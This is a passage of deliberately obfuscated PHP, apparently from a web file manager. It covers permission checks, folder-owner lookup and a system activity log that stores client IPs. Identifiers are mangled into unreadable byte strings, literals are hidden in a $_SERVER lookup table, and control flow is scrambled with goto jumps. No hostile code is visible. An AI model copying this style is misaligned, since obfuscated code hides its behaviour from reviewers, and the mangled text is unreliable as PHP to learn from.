Model($bÑØã¢“Àß[1113])->parentLevelArray($Dò×èˆ­‘[$bÑØã¢“Àß[454]]); goto D¿íÉ…¨²ñ; c¸ğ¾ˆ¨ÈÏ: if (!$dÉ†Õ„Éƒ) { $B´­¼½†ˆß = array_to_keyvalue($B´­¼½†ˆß, $bÑØã¢“Àß[2080]); $E†ÒñÑôÒğ = $Dò×èˆ­‘[$bÑØã¢“Àß[451]]; $cÄ˜áˆ¢ = isset($B´­¼½†ˆß[$E†ÒñÑôÒğ]) ? $B´­¼½†ˆß[$E†ÒñÑôÒğ] : !1; if ($cÄ˜áˆ¢) { $dÉ†Õ„Éƒ = array($bÑØã¢“Àß[2236] => intval($cÄ˜áˆ¢[$bÑØã¢“Àß[372]][$bÑØã¢“Àß[372]]), $bÑØã¢“Àß[2237] => $cÄ˜áˆ¢[$bÑØã¢“Àß[372]]); } } if ((!$dÉ†Õ„Éƒ || $dÉ†Õ„Éƒ[$bÑØã¢“Àß[373]] <= 0) && $Dò×èˆ­‘[$bÑØã¢“Àß[367]] == SourceModel::TYPE_GROUP) { $d‰„¶‡„îÌ = $this->authDeepCheck($Dò×èˆ­‘[$bÑØã¢“Àß[365]], $dÉ†Õ„Éƒ); if ($d‰„¶‡„îÌ) { $dÉ†Õ„Éƒ = $d‰„¶‡„îÌ; } } return $dÉ†Õ„Éƒ; goto a›ÀàŸ½Œ; D¿íÉ…¨²ñ: $a¢Ç‰ÇÏ = array_merge(array($Dò×èˆ­‘[$bÑØã¢“Àß[365]]), array_reverse($a¢Ç‰ÇÏ)); $dÉ†Õ„Éƒ = !1; foreach ($a¢Ç‰ÇÏ as $fÈßÇåƒ˜¿) { if (!isset($eÊ˜÷¨Œ±[$fÈßÇåƒ˜¿])) { continue; } $A“‰‘Â”à® = $this->authMake($eÊ˜÷¨Œ±[$fÈßÇåƒ˜¿]); if ($A“‰‘Â”à®[$bÑØã¢“Àß[413]]) { $dÉ†Õ„Éƒ = $A“‰‘Â”à®; break; } } goto c¸ğ¾ˆ¨ÈÏ; a›ÀàŸ½Œ: } public function authOwnerApply($A›»èöñ) { goto fğŒ†åÅÔ¸; bå¢Õ¾îùœ: if (count($a²¼‘·Æã²) == 0) { $a²¼‘·Æã² = $this->authFolderOwnerGroup($A›»èöñ[$AõÅ‡·¼[451]]); } $a²¼‘·Æã² = array_unique($a²¼‘·Æã²); if (AuthModel::authCheckRoot($A›»èöñ[$AõÅ‡·¼[372]][$AõÅ‡·¼[373]])) { $a²¼‘·Æã²[] = USER_ID; } goto D«ØË­İ¶Ÿ; DÊÔƒ‡ÒÀò: $Aí›Å‰¼‡ = array(); $a²¼‘·Æã² = array(); foreach ($D“®÷¸—ç as $báÃòâÄ›‹ => $d™Ö£’ó•Ú) { $Dµ¹èŒ‚í÷ = $this->authFolderOwnerUser($d™Ö£’ó•Ú); $Aí›Å‰¼‡[$báÃòâÄ›‹] = $Dµ¹èŒ‚í÷; $a²¼‘·Æã² = array_merge($a²¼‘·Æã², $Dµ¹èŒ‚í÷[$AõÅ‡·¼[530]]); if ($Dµ¹èŒ‚í÷[$AõÅ‡·¼[2239]]) { break; } } goto bå¢Õ¾îùœ; D«ØË­İ¶Ÿ: $A›»èöñ[$AõÅ‡·¼[372]][$AõÅ‡·¼[2240]] = Model($AõÅ‡·¼[469])->userListInfo($a²¼‘·Æã²); return $A›»èöñ; goto BÇç®ÚÜŠ×; Eğˆİ³éÃ: $eËšÚëÒÇ‘ = Model($AõÅ‡·¼[1113])->parentLevelArray($A›»èöñ[$AõÅ‡·¼[454]]); $eËšÚëÒÇ‘ = array_merge(array($A›»èöñ[$AõÅ‡·¼[365]]), array_reverse($eËšÚëÒÇ‘)); $EĞ’‰ãğ„ = $AõÅ‡·¼[2230]; goto a®ÌÓåîŒà; a®ÌÓåîŒà: $CÊïßÍàÒ³ = array($AõÅ‡·¼[379] => array($AõÅ‡·¼[380], $eËšÚëÒÇ‘)); $D“®÷¸—ç = $this->field($EĞ’‰ãğ„)->where($CÊïßÍàÒ³)->select(); $D“®÷¸—ç = array_to_keyvalue_group($D“®÷¸—ç, $AõÅ‡·¼[365]); goto DÊÔƒ‡ÒÀò; fğŒ†åÅÔ¸: $AõÅ‡·¼ =& $_SERVER[Õİõş]; if (empty($A›»èöñ[$AõÅ‡·¼[372]]) || isset($A›»èöñ[$AõÅ‡·¼[2238]]) && $A›»èöñ[$AõÅ‡·¼[2238]]) { return $A›»èöñ; } if (AuthModel::authCheckRoot($A›»èöñ[$AõÅ‡·¼[372]][$AõÅ‡·¼[373]])) { return $A›»èöñ; } goto Eğˆİ³éÃ; BÇç®ÚÜŠ×: } private function authFolderOwnerGroup($bª¸¢ùïÙŒ) { $DÈ¤½Ù¶”Ï =& $_SERVER[Õİõş]; $DËÒ†“èŸ = Model($DÈ¤½Ù¶”Ï[2154])->where(array($DÈ¤½Ù¶”Ï[2080] => $bª¸¢ùïÙŒ))->select(); $f°õÉäÓ‚“ = array(); if (!$DËÒ†“èŸ) { return $f°õÉäÓ‚“; } foreach ($DËÒ†“èŸ as $E°ŒêÒ¨¢—) { $cƒ‰ÜĞë÷õ = $this->authInfo($E°ŒêÒ¨¢—); if (AuthModel::authCheckRoot($cƒ‰ÜĞë÷õ[$DÈ¤½Ù¶”Ï[372]])) { $f°õÉäÓ‚“[] = $E°ŒêÒ¨¢—[$DÈ¤½Ù¶”Ï[1417]]; } } return $f°õÉäÓ‚“; } private function authFolderOwnerUser($d¨«×¥À«) { $fôì¯¯ƒ£ =& $_SERVER[Õİõş]; $Dó„ƒêé‘ = array(); $d‘‚­¶™› = !1; foreach ($d¨«×¥À« as $d¸š¿İòÒä) { $cŠ†ò‰ÂÎ­ = $this->authInfo($d¸š¿İòÒä); if ($d¸š¿İòÒä[$fôì¯¯ƒ£[451]] == $fôì¯¯ƒ£[463]) { $d‘‚­¶™› = !0; } if ($d¸š¿İòÒä[$fôì¯¯ƒ£[367]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($cŠ†ò‰ÂÎ­[$fôì¯¯ƒ£[372]])) { $Dó„ƒêé‘[] = $d¸š¿İòÒä[$fôì¯¯ƒ£[451]]; } } } return array($fôì¯¯ƒ£[530] => $Dó„ƒêé‘, $fôì¯¯ƒ£[2239] => $d‘‚­¶™›); } public function authMake($f½›¾×ÂôÎ) { goto dîæù÷ÃÛĞ; e»ÓŠÃ‡îœ: $d×ğÑ‘™±Ë = 0; $f³ğ„Ó…ÙÉ = 0; $fÌæùæ’í = 0; goto eÚÎ¼ÒÂ·ë; dîæù÷ÃÛĞ: $BŞà’¨îù =& $_SERVER[Õİõş]; if (!$f½›¾×ÂôÎ) { return array($BŞà’¨îù[373] => 0, $BŞà’¨îù[413] => !1); } $C¢ÔŞÆ³ Ÿ = Session::get($BŞà’¨îù[2192]); goto AàéàˆÁİ; e½£ÙèË¹õ: $EÊÅïšœƒ‰ = $f³ğ„Ó…ÙÉ ? $a¶ÉÙ‰µ…Ç : ($fÌæùæ’í ? $b¤¦ê¤´Û : $d×ğÑ‘™±Ë); $dÅÓğ‡Ì³« = array($BŞà’¨îù[2236] => intval($eÖÎÖÈ“›¶), $BŞà’¨îù[2237] => $EÊÅïšœƒ‰); return $dÅÓğ‡Ì³«; goto CééÈ’„ä±; EŒÔ„ò¶«: $a‘Ôª’¬„° = 0; $a¶ÉÙ‰µ…Ç = 0; $b¤¦ê¤´Û = 0; goto e»ÓŠÃ‡îœ; eÚÎ¼ÒÂ·ë: $BÓäÓœ‘íë = 0; foreach ($f½›¾×ÂôÎ as $B„™‚†ª í) { $EÊÅïšœƒ‰ = $this->authInfo($B„™‚†ª í); $cŸÈÍ‰ÈÌğ = $B„™‚†ª í[$BŞà’¨îù[451]]; $f¡‹ÂİÃÈá = intval($EÊÅïšœƒ‰[$BŞà’¨îù[372]]); if ($B„™‚†ª í[$BŞà’¨îù[367]] == SourceModel::TYPE_USER && $cŸÈÍ‰ÈÌğ == USER_ID) { $f³ğ„Ó…ÙÉ = !0; $a¶ÉÙ‰µ…Ç = $EÊÅïšœƒ‰; $EÌÀòÏêÀª = $f¡‹ÂİÃÈá; } else { if ($B„™‚†ª í[$BŞà’¨îù[367]] == SourceModel::TYPE_GROUP && in_array($cŸÈÍ‰ÈÌğ, $bœ›îæº“)) { $fÌæùæ’í = !0; if ($f¡‹ÂİÃÈá >= $cñ’ÑÊ ñÈ) { $cñ’ÑÊ ñÈ = $f¡‹ÂİÃÈá; $b¤¦ê¤´Û = $EÊÅïšœƒ‰; } } else { if ($cŸÈÍ‰ÈÌğ == $BŞà’¨îù[463]) { $BÓäÓœ‘íë = !0; $d×ğÑ‘™±Ë = $EÊÅïšœƒ‰; $a‘Ôª’¬„° = $f¡‹ÂİÃÈá; } } } } $eÖÎÖÈ“›¶ = $f³ğ„Ó…ÙÉ ? $EÌÀòÏêÀª : ($fÌæùæ’í ? $cñ’ÑÊ ñÈ : $a‘Ôª’¬„°); goto e½£ÙèË¹õ; AàéàˆÁİ: $bœ›îæº“ = array_to_keyvalue($C¢ÔŞÆ³ Ÿ, $BŞà’¨îù[33], $BŞà’¨îù[2080]); $EÌÀòÏêÀª = 0; $cñ’ÑÊ ñÈ = 0; goto EŒÔ„ò¶«; CééÈ’„ä±: } public function authTargetInfoMake($F†ì•Ó…ÃŸ) { goto dÆğÒéÚˆ; F§ã«º‡Ê¢: foreach ($F†ì•Ó…ÃŸ as $bëŸœä’øŸ) { if ($bëŸœä’øŸ[$Eƒ¦ƒöÇã“[367]] == SourceModel::TYPE_USER) { $e´Œœã¿²ä[] = intval($bëŸœä’øŸ[$Eƒ¦ƒöÇã“[451]]); } else { if ($bëŸœä’øŸ[$Eƒ¦ƒöÇã“[367]] == SourceModel::TYPE_GROUP) { $fÉ½Ú›·¤ [] = intval($bëŸœä’øŸ[$Eƒ¦ƒöÇã“[451]]); } } } if ($e´Œœã¿²ä) { $e´Œœã¿²ä = Model($Eƒ¦ƒöÇã“[469])->userListInfo($e´Œœã¿²ä); } if ($fÉ½Ú›·¤ ) { $cºÚÄ©÷ÌŞ = array($Eƒ¦ƒöÇã“[2152] => array($Eƒ¦ƒöÇã“[380], $fÉ½Ú›·¤ )); $fÉ½Ú›·¤  = Model($Eƒ¦ƒöÇã“[453])->field($Eƒ¦ƒöÇã“[2165])->where($cºÚÄ©÷ÌŞ)->select(); $fÉ½Ú›·¤  = array_to_keyvalue($fÉ½Ú›·¤ , $Eƒ¦ƒöÇã“[2080]); } goto A”Öóµùù›; A”Öóµùù›: return array($Eƒ¦ƒöÇã“[2241] => $e´Œœã¿²ä, $Eƒ¦ƒöÇã“[2242] => $fÉ½Ú›·¤ ); goto báìÜ¿ƒ; dÆğÒéÚˆ: $Eƒ¦ƒöÇã“ =& $_SERVER[Õİõş]; $e´Œœã¿²ä = array(); $fÉ½Ú›·¤  = array(); goto F§ã«º‡Ê¢; báìÜ¿ƒ: } private function authInfo($Eí›òÈÜãë) { $bí¨àÖÙÄ… =& $_SERVER[Õİõş]; if ($Eí›òÈÜãë[$bí¨àÖÙÄ…[2208]]) { $DñĞÊÀê… = Model($bí¨àÖÙÄ…[2227])->listData($Eí›òÈÜãë[$bí¨àÖÙÄ…[2208]]); if (!$DñĞÊÀê…) { return !1; $A„ĞÃ¹îˆ = Model($bí¨àÖÙÄ…[2227])->listData(); $b­ºÜŞõ±¤ = array_filter_by_field($A„ĞÃ¹îˆ, $bí¨àÖÙÄ…[372], $bí¨àÖÙÄ…[463]); return $b­ºÜŞõ±¤; } $dÄÃ†¡»È = array_field_key($DñĞÊÀê…, array($bí¨àÖÙÄ…[363], $bí¨àÖÙÄ…[28], $bí¨àÖÙÄ…[372], $bí¨àÖÙÄ…[2098], $bí¨àÖÙÄ…[2101])); $dÄÃ†¡»È[$bí¨àÖÙÄ…[2243]] = $Eí›òÈÜãë; return $dÄÃ†¡»È; } else { return array($bí¨àÖÙÄ…[381] => 0, $bí¨àÖÙÄ…[2086] => $Eí›òÈÜãë[$bí¨àÖÙÄ…[2209]], $bí¨àÖÙÄ…[382] => $bí¨àÖÙÄ…[33], $bí¨àÖÙÄ…[2098] => $bí¨àÖÙÄ…[2244]); } } } goto b «§§; eÙäºÜ‹–½: function beforeShutdownFatalError($Fé´§Ò†‹‹) { think_exception($Fé´§Ò†‹‹); } $_SERVER[$_SERVER[†ı´][48]] = $C«ØÍ¯µÒ($_SERVER[$_SERVER[†ı´][45]]); $EºãÆÌÒÊö = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto cªÉêÇ‰‹ù; CÑèÉ±‘Š: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\56\114\151\x67\x68\x74\101\160\x70"; public $modelType = "\123\x79\x73\164\145\155\x4f\x70\164\151\157\156"; public $field = array("\x6e\141\x6d\x65", "\147\x72\157\165\x70", "\144\x65\163\x63", "\x63\x6f\x6e\x74\145\x6e\164"); public function listData($d…•Ï™Ö¢Š = false, $f‡˜ÖÂĞÂ = "\155\x6f\x64\151\x66\x79\x54\151\x6d\x65", $E‰ÔœªöÖ“ = true) { return parent::listData($d…•Ï™Ö¢Š, $f‡˜ÖÂĞÂ, $E‰ÔœªöÖ“); } public function remove($Cˆ˜™¢šŠ) { $CËˆ¢³—¡ = $this->findByName($Cˆ˜™¢šŠ); if (!$CËˆ¢³—¡) { return !1; } return parent::remove($CËˆ¢³—¡[$_SERVER[Õİõş][363]]); } public function add($EÒÁÏ¥‹•ê) { if ($this->findByName($EÒÁÏ¥‹•ê[$_SERVER[Õİõş][28]])) { return !1; } return parent::insert($EÒÁÏ¥‹•ê); } public function update($BøæöÉæºŸ, $c£»”÷§‚ˆ) { $f«•İçÔªÊ =& $_SERVER[Õİõş]; $DŸÅÚ¢£² = $this->findByName($BøæöÉæºŸ); $d«ºˆÁÁƒÀ = $this->findByName($c£»”÷§‚ˆ[$f«•İçÔªÊ[28]]); if (!$DŸÅÚ¢£² || $d«ºˆÁÁƒÀ && $d«ºˆÁÁƒÀ[$f«•İçÔªÊ[363]] != $DŸÅÚ¢£²[$f«•İçÔªÊ[363]]) { return !1; } return parent::update($DŸÅÚ¢£²[$f«•İçÔªÊ[363]], $c£»”÷§‚ˆ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\155\x5f\154\157\147"; protected $dataAuto = array(array("\143\162\145\x61\164\145\124\151\155\x65", "\164\x69\155\x65", "\151\156\x73\145\162\164", "\146\x75\156\x63\x74\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $cÂçÁ›¾„ñ =& $_SERVER[Õİõş]; return array($cÂçÁ›¾„ñ[2345] => LNG($cÂçÁ›¾„ñ[2346]), $cÂçÁ›¾„ñ[2347] => LNG($cÂçÁ›¾„ñ[2348]), $cÂçÁ›¾„ñ[2020] => LNG($cÂçÁ›¾„ñ[2349]), $cÂçÁ›¾„ñ[2350] => LNG($cÂçÁ›¾„ñ[2351]), $cÂçÁ›¾„ñ[2352] => LNG($cÂçÁ›¾„ñ[2353]), $cÂçÁ›¾„ñ[2354] => LNG($cÂçÁ›¾„ñ[2355]), $cÂçÁ›¾„ñ[2356] => LNG($cÂçÁ›¾„ñ[2357]), $cÂçÁ›¾„ñ[2358] => LNG($cÂçÁ›¾„ñ[2359]), $cÂçÁ›¾„ñ[2051] => LNG($cÂçÁ›¾„ñ[2360]), $cÂçÁ›¾„ñ[2052] => LNG($cÂçÁ›¾„ñ[2361]), $cÂçÁ›¾„ñ[2362] => LNG($cÂçÁ›¾„ñ[2363]), $cÂçÁ›¾„ñ[2364] => LNG($cÂçÁ›¾„ñ[2365]), $cÂçÁ›¾„ñ[2366] => LNG($cÂçÁ›¾„ñ[2367]), $cÂçÁ›¾„ñ[2368] => LNG($cÂçÁ›¾„ñ[2369]), $cÂçÁ›¾„ñ[2049] => LNG($cÂçÁ›¾„ñ[2370]), $cÂçÁ›¾„ñ[2055] => LNG($cÂçÁ›¾„ñ[2371]), $cÂçÁ›¾„ñ[2372] => LNG($cÂçÁ›¾„ñ[2373]), $cÂçÁ›¾„ñ[2374] => LNG($cÂçÁ›¾„ñ[2375]), $cÂçÁ›¾„ñ[2376] => LNG($cÂçÁ›¾„ñ[2377]), $cÂçÁ›¾„ñ[2378] => LNG($cÂçÁ›¾„ñ[2379]), $cÂçÁ›¾„ñ[2058] => LNG($cÂçÁ›¾„ñ[2380]), $cÂçÁ›¾„ñ[2059] => LNG($cÂçÁ›¾„ñ[2381]), $cÂçÁ›¾„ñ[2382] => LNG($cÂçÁ›¾„ñ[2383]), $cÂçÁ›¾„ñ[2384] => LNG($cÂçÁ›¾„ñ[2385]), $cÂçÁ›¾„ñ[2386] => LNG($cÂçÁ›¾„ñ[2387]), $cÂçÁ›¾„ñ[2388] => LNG($cÂçÁ›¾„ñ[2389]), $cÂçÁ›¾„ñ[2390] => LNG($cÂçÁ›¾„ñ[2391]), $cÂçÁ›¾„ñ[2053] => LNG($cÂçÁ›¾„ñ[2392]), $cÂçÁ›¾„ñ[2393] => LNG($cÂçÁ›¾„ñ[2394]), $cÂçÁ›¾„ñ[2395] => LNG($cÂçÁ›¾„ñ[2396]), $cÂçÁ›¾„ñ[2397] => LNG($cÂçÁ›¾„ñ[2397]), $cÂçÁ›¾„ñ[2398] => LNG($cÂçÁ›¾„ñ[2024]), $cÂçÁ›¾„ñ[2399] => LNG($cÂçÁ›¾„ñ[2400]), $cÂçÁ›¾„ñ[2401] => LNG($cÂçÁ›¾„ñ[2402]), $cÂçÁ›¾„ñ[2403] => LNG($cÂçÁ›¾„ñ[2404]), $cÂçÁ›¾„ñ[2405] => LNG($cÂçÁ›¾„ñ[2406]), $cÂçÁ›¾„ñ[2407] => LNG($cÂçÁ›¾„ñ[2408]), $cÂçÁ›¾„ñ[2409] => LNG($cÂçÁ›¾„ñ[2409]), $cÂçÁ›¾„ñ[2410] => LNG($cÂçÁ›¾„ñ[2411]), $cÂçÁ›¾„ñ[2412] => LNG($cÂçÁ›¾„ñ[2413]), $cÂçÁ›¾„ñ[2414] => LNG($cÂçÁ›¾„ñ[2415]), $cÂçÁ›¾„ñ[2416] => LNG($cÂçÁ›¾„ñ[2417]), $cÂçÁ›¾„ñ[2418] => LNG($cÂçÁ›¾„ñ[2419]), $cÂçÁ›¾„ñ[2420] => LNG($cÂçÁ›¾„ñ[2421])); } private function typeFile() { $AÊèÖÈÄç³ =& $_SERVER[Õİõş]; $b˜¯¨‹ƒŞº = array($AÊèÖÈÄç³[2055] => array($AÊèÖÈÄç³[2056]), $AÊèÖÈÄç³[2366] => array($AÊèÖÈÄç³[2422]), $AÊèÖÈÄç³[2368] => array($AÊèÖÈÄç³[2423]), $AÊèÖÈÄç³[2049] => array($AÊèÖÈÄç³[2050]), $AÊèÖÈÄç³[2374] => array(), $AÊèÖÈÄç³[2376] => array(), $AÊèÖÈÄç³[2378] => array(), $AÊèÖÈÄç³[2058] => array($AÊèÖÈÄç³[2060]), $AÊèÖÈÄç³[2059] => array($AÊèÖÈÄç³[2060]), $AÊèÖÈÄç³[2382] => array($AÊèÖÈÄç³[2424]), $AÊèÖÈÄç³[2384] => array($AÊèÖÈÄç³[2424]), $AÊèÖÈÄç³[2386] => array($AÊèÖÈÄç³[2425]), $AÊèÖÈÄç³[2372] => array($AÊèÖÈÄç³[2426]), $AÊèÖÈÄç³[2388] => array($AÊèÖÈÄç³[2427]), $AÊèÖÈÄç³[2390] => array($AÊèÖÈÄç³[2428]), $AÊèÖÈÄç³[2053] => array($AÊèÖÈÄç³[2054])); return $b˜¯¨‹ƒŞº; } private function typeAll() { goto a­‰¢Æç¿’; bÓ„ÎçÄ: foreach ($cŒÒ·Ô‘Õø as $C‚‘²”ÌÄ => $EˆÅòµ•İ) { $C›÷íà‘Å[$EˆÅòµ•İ[0]] = $C›÷íà‘Å[$C‚‘²”ÌÄ]; } $C›÷íà‘Å[$AÈé‚´ˆ…[2060]] = LNG($AÈé‚´ˆ…[2429]); $C›÷íà‘Å[$AÈé‚´ˆ…[2424]] = LNG($AÈé‚´ˆ…[2430]); goto D éÂ„‡¾Í; D éÂ„‡¾Í: return $C›÷íà‘Å; goto Dš‰²‘öÁÚ; a­‰¢Æç¿’: $AÈé‚´ˆ… =& $_SERVER[Õİõş]; $C›÷íà‘Å = $this->typeList; $cŒÒ·Ô‘Õø = array_filter($this->typeFile()); goto bÓ„ÎçÄ; Dš‰²‘öÁÚ: } public function addLog($A–à¯‡ºŠ, $A”öÖ›óÙ× = array()) { goto e¯¨œõ×™†; e¯¨œõ×™†: $DæéÂ¢£äÉ =& $_SERVER[Õİõş]; if (!isset($this->typeList[$A–à¯‡ºŠ])) { return; } $cÂø¤ğƒÃô = USER_ID ? USER_ID : (isset($A”öÖ›óÙ×[$DæéÂ¢£äÉ[1417]]) ? $A”öÖ›óÙ×[$DæéÂ¢£äÉ[1417]] : 0); goto côÁ†¦—„; BÖ‡’õÑ¸: parent::add($A”öÖ›óÙ×); goto AÙÕ¥ˆŸˆÍ; côÁ†¦—„: $F¡ìŞ´„˜ = get_client_ip(); if (!$A”öÖ›óÙ× || strlen(json_encode($A”öÖ›óÙ×)) >= 1024) { $A”öÖ›óÙ× = array($DæéÂ¢£äÉ[2431] => $F¡ìŞ´„˜); } else { if (is_array($A”öÖ›óÙ×)) { $A”öÖ›óÙ×[$DæéÂ¢£äÉ[2431]] = $F¡ìŞ´„˜; } else { $A”öÖ›óÙ× = array($DæéÂ¢£äÉ[1037] => $A”öÖ›óÙ×, $DæéÂ¢£äÉ[2431] => $F¡ìŞ´„˜); } } $A”öÖ›óÙ× = array($DæéÂ¢£äÉ[1407] => Session::sign(), $DæéÂ¢£äÉ[1408] => $cÂø¤ğƒÃô, $DæéÂ¢£äÉ[29] => $A–à¯‡ºŠ, $DæéÂ¢£äÉ[1410] => json_encode($A”öÖ›óÙ×)); goto BÖ‡’õÑ¸; AÙÕ¥ˆŸˆÍ: } public function remove($bÎïšÄš®») { $this->where(array($_SERVER[Õİõş][381] => $bÎïšÄš®»))->delete(); } private function _makeOrder($e¢•†”Úø = '') { goto f´‘ŠÑªÎ»; Bœ¥¦“í¶: $a·µáƒ²…… = Input::get($E…½Ú™–§[403], $E…½Ú™–§[7], $E…½Ú™–§[2218], array($E…½Ú™–§[2155], $E…½Ú™–§[399])); $a·µáƒ²…… = $eóˆñ¡õØ¤[$a·µáƒ²……]; $e¢•†”Úø = $e¢•†”Úø . "{$D¤õ¼ÒÑíß}\x20{$a·µáƒ²……}"; goto C¶ÚÌÎ¦¼; C¶ÚÌÎ¦¼: return $this->order($e¢•†”Úø); goto e‚Û¶‹ŠÓ™; f´‘ŠÑªÎ»: $E…½Ú™–§ =& $_SERVER[Õİõş]; $D¤õ¼ÒÑíß = $E…½Ú™–§[183]; $eóˆñ¡õØ¤ = array($E…½Ú™–§[397] => $E…½Ú™–§[398], $E…½Ú™–§[399] => $E…½Ú™–§[400]); goto Bœ¥¦“í¶; e‚Û¶‹ŠÓ™: } public function get($eÔè˜‹©«Î = '') { goto fØ£Ø— ¡; b’É¥±Á¤: if (!empty($eÔè˜‹©«Î[$Eİ¨„Ê˜İ[2431]])) { $D’„ÀŠ…«Ğ[$Eİ¨„Ê˜İ[400]] = array($Eİ¨„Ê˜İ[753], "\45{$eÔè˜‹©«Î[$Eİ¨„Ê˜İ[2431]]}\45"); } $däÒ´Û‚Ü˜ = $this->_makeOrder()->where($D’„ÀŠ…«Ğ)->selectPage(); if (empty($däÒ´Û‚Ü˜[$Eİ¨„Ê˜İ[350]])) { show_json(array(), !0, $däÒ´Û‚Ü˜[$Eİ¨„Ê˜İ[347]]); } goto EÂÅ”÷å»è; EÂÅ”÷å»è: $däÒ´Û‚Ü˜[$Eİ¨„Ê˜İ[350]] = $this->logList($däÒ´Û‚Ü˜[$Eİ¨„Ê˜İ[350]]); return $däÒ´Û‚Ü˜; goto bÕšÕ¤ç¼; fØ£Ø— ¡: $Eİ¨„Ê˜İ =& $_SERVER[Õİõş]; if (!$eÔè˜‹©«Î) { show_json(array()); } $D’„ÀŠ…«Ğ = array(); goto EàÔÊ›éè‰; EàÔÊ›éè‰: if ($eÔè˜‹©«Î[$Eİ¨„Ê˜İ[1417]]) { $D’„ÀŠ…«Ğ[$Eİ¨„Ê˜İ[1417]] = $eÔè˜‹©«Î[$Eİ¨„Ê˜İ[1417]]; } if (isset($eÔè˜‹©«Î[$Eİ¨„Ê˜İ[704]])) { $EŠœ›çÀ¾œ = $eÔè˜‹©«Î[$Eİ¨„Ê˜İ[704]]; $bøÑã³ÖÍ” = isset($eÔè˜‹©«Î[$Eİ¨„Ê˜İ[705]]) ? $eÔè˜‹©«Î[$Eİ¨„Ê˜İ[705]] : time(); $D’„ÀŠ…«Ğ[$Eİ¨„Ê˜İ[183]] = array($Eİ¨„Ê˜İ[317], array($EŠœ›çÀ¾œ, $bøÑã³ÖÍ”)); } if ($eÔè˜‹©«Î[$Eİ¨„Ê˜İ[29]]) { $DË›¸ÂÙ‹¹ = explode($Eİ¨„Ê˜İ[47], $eÔè˜‹©«Î[$Eİ¨„Ê˜İ[29]]); $b»¿Ãäª…Ş = $this->typeFile(); $f—°—›·˜× = array(); foreach ($DË›¸ÂÙ‹¹ as $EßÅ¾÷Ê) { $f—°—›·˜×[] = $EßÅ¾÷Ê; if (isset($b»¿Ãäª…Ş[$EßÅ¾÷Ê])) { $f—°—›·˜× = array_merge($f—°—›·˜×, $b»¿Ãäª…Ş[$EßÅ¾÷Ê]); } } $f—°—›·˜× = array_unique($f—°—›·˜×); if ($f—°—›·˜×) { $D’„ÀŠ…«Ğ[$Eİ¨„Ê˜İ[29]] = array($Eİ¨„Ê˜İ[7], $f—°—›·˜×); } } goto b’É¥±Á¤; bÕšÕ¤ç¼: } private function ipAddress(&$FçÕÍ­¿¥Ì) { $d‰è¨åÑÃ =& $_SERVER[Õİõş]; if (!empty($FçÕÍ­¿¥Ì[$d‰è¨åÑÃ[2431]])) { $b¹œ×¨œ‡· = IpLocation::get($FçÕÍ­¿¥Ì[$d‰è¨åÑÃ[2431]]); if ($b¹œ×¨œ‡· == $d‰è¨åÑÃ[2432]) { $b¹œ×¨œ‡· = $d‰è¨åÑÃ[2433]; } } else { $b¹œ×¨œ‡· = LNG($d‰è¨åÑÃ[2434]); } $FçÕÍ­¿¥Ì[$d‰è¨åÑÃ[2435]] = $b¹œ×¨œ‡·; } private function descZipDownload($dÏ™øÚø‚, &$E‚‚ÆÒ×Ô‰) { $dï©µ×Â¯Ö =& $_SERVER[Õİõş]; if (!isset($dÏ™øÚø‚[$dï©µ×Â¯Ö[2436]])) { return; } $bÆÕ®§Àòî = json_decode($dÏ™øÚø‚[$dï©µ×Â¯Ö[2436]], !0); foreach ($bÆÕ®§Àòî as $EÅŠåÛÜ¼ƒ) { if (!IO::init($EÅŠåÛÜ¼ƒ[$dï©µ×Â¯Ö[75]])) { continue; } if (!($bö¦ƒÚèùˆ = IO::infoFull($EÅŠåÛÜ¼ƒ[$dï©µ×Â¯Ö[75]]))) { continue; } $dÏ™øÚø‚[$dï©µ×Â¯Ö[75]] = $EÅŠåÛÜ¼ƒ[$dï©µ×Â¯Ö[75]]; $E‚‚ÆÒ×Ô‰[] = $dÏ™øÚø‚[$dï©µ×Â¯Ö[365]] = $bö¦ƒÚèùˆ[$dï©µ×Â¯Ö[365]]; $E‚‚ÆÒ×Ô‰[] = $dÏ™øÚø‚[$dï©µ×Â¯Ö[2251]] = $bö¦ƒÚèùˆ[$dï©µ×Â¯Ö[456]]; break; } return $dÏ™øÚø‚; } private function getSourceList(&$b¸±øà–æ‡) { $cå¹Ü¦­·Ò =& $_SERVER[Õİõş]; $A•°š˜åÍ  = array(); foreach ($b¸±øà–æ‡ as $f¯í‰Ø–Õ => $D¾¿ß«ùŠĞ) { goto b­„‘óÔÒˆ; fí¶‘Âä: $A•°š˜åÍ [] = $f¡Ì­Ûª½ø[$cå¹Ü¦­·Ò[365]]; $A•°š˜åÍ [] = $f¡Ì­Ûª½ø[$cå¹Ü¦­·Ò[2251]]; if ($f¡Ì­Ûª½ø[$cå¹Ü¦­·Ò[29]] == $cå¹Ü¦­·Ò[487]) { $A•°š˜åÍ [] = $f¡Ì­Ûª½ø[$cå¹Ü¦­·Ò[400]][$cå¹Ü¦­·Ò[1008]]; $A•°š˜åÍ [] = $f¡Ì­Ûª½ø[$cå¹Ü¦­·Ò[400]][$cå¹Ü¦­·Ò[1009]]; } goto c¯ë®ˆÏ¸; b­„‘óÔÒˆ: $f¡Ì­Ûª½ø = json_decode($D¾¿ß«ùŠĞ[$cå¹Ü¦­·Ò[400]], !0); if ($D¾¿ß«ùŠĞ[$cå¹Ü¦­·Ò[29]] == $cå¹Ü¦­·Ò[2052]) { $f¡Ì­Ûª½ø = $this->descZipDownload($f¡Ì­Ûª½ø, $A•°š˜åÍ ); $b¸±øà–æ‡[$f¯í‰Ø–Õ][$cå¹Ü¦­·Ò[400]] = json_encode($f¡Ì­Ûª½ø); continue; } if (strpos($D¾¿ß«ùŠĞ[$cå¹Ü¦­·Ò[29]], $cå¹Ü¦­·Ò[2252]) !== 0) { goto aªğÓ¿“î; Fæ×ƒ˜ÀÈ°: continue; goto EÑª¬¬Íáâ; fÛ¬îÈ“£‡: $A•°š˜åÍ [] = $f¡Ì­Ûª½ø[$cå¹Ü¦­·Ò[365]] = $c•»šß À†[$cå¹Ü¦­·Ò[365]]; $A•°š˜åÍ [] = $f¡Ì­Ûª½ø[$cå¹Ü¦­·Ò[2251]] = $c•»šß À†[$cå¹Ü¦­·Ò[456]]; 